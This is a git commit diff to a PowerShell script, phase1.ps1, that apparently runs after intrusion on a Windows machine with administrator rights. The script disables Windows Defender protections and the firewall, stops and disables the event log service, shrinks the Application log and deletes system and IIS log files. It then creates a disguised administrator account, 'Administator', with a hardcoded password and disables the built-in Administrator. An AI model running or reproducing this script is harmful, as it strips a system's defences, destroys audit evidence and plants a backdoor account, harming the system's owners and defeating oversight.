43e8aaf2f0663a5ee39eff19558f6b712561a759
Pragun Bajracharya <pragunbaj99@gmail.com>
2023-04-07 15:52:28 -0400

    Update phase1.ps1

--- phase1.ps1
+++ phase1.ps1
@@ -54,6 +54,8 @@ Function removeLogFilesFromAFolder {
         Write-Host "File deleted from " + $FolderPath
     }
 }
+
+Write-Host "Validating Administrative permissions ..."
  
 #Check Script is running with Elevated Privileges
 if(checkRunAsAdministrator) {
@@ -61,22 +63,34 @@ if(checkRunAsAdministrator) {
 
     # Disabled Windows Defender
     # Run this before the script
+    Write-Host "Disabling Firewalls .."
     Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true
-
+    
     # Disabled Firewalld
     Set-NetFirewallProfile -Enabled False
 
+    Write-Host "Firewall Dsiabled"
+
     #Disabled the EventLog Service
+    Write-Host "Disabling System EventLog Service..."
+    Set-Service -Name eventlog -StartupType Disabled
+    Stop-Service -Name eventlog -Force
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" -Name "Start" -Value 0 -Type DWord
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Application" -Name "Start" -Value 4 -Type DWord
+
+    Write-Host "Event Log Service Disabled"
 
     # Decreased max size of event log application to 10KB
     $eventLog = New-Object System.Diagnostics.EventLog("Application")
     $eventLog.MaximumKilobytes = 64
     $eventLog.ModifyOverflowPolicy("OverwriteAsNeeded", 0)
 
+    Write-Host "System Log Size Reduced to 64 byte"
+
 
     #Removed all the log files
+    Write-Host "Removing System and Event Log Files..."
+
     removeLogFilesFromAFolder -Folderpath "C:\Logs"
     removeLogFilesFromAFolder -Folderpath "C:\Windows\System32\winevt\Logs"
     removeLogFilesFromAFolder -Folderpath "C:\inetpub\logs\LogFiles"
@@ -86,10 +100,14 @@ if(checkRunAsAdministrator) {
     #Rename-LocalUser -Name "Administrator" -NewName "Admin"
 
     # Create new user with Admin privilages
-    New-LocalUser -Name "Administator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force) -FullName "Guest" -Description "" -AccountNeverExpires
-    Add-LocalGroupMember -Group "Administrators" -Member "Geust"
+
+    Write-Host "Creating new user with admin privilage.."
+    New-LocalUser -Name "Administator" -Password (ConvertTo-SecureString "p@ssword123" -AsPlainText -Force) -FullName "Administrator" -Description "" -AccountNeverExpires
+    Add-LocalGroupMember -Group "Administrators" -Member "Administator"
+    Write-Host "New User Created"
 
     # Disable the "Administrator" account
+    Write-Host "Disabling built-in Administrator user"
     net user Administrator /active:no
 
     #Enabled Firewalld
